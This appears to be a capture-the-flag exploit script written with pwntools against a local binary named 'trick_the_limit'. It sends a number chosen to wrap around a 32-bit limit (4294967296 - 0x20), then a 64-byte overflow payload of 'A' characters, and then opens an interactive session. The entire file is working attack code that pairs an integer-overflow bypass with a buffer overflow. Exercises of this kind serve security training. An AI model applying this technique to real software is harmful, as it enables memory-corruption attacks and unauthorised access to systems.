from pwn import *

r = process('./trick_the_limit')

B = 4294967296 - 0x20

ANSWER = str(B)
PAYLOAD = b'\x41' * 0x40

print(ANSWER)

r.recvuntil(b'Enter your number: ')
r.sendline(ANSWER.encode('utf-8'))

sleep(1)

r.sendline(PAYLOAD)

r.interactive()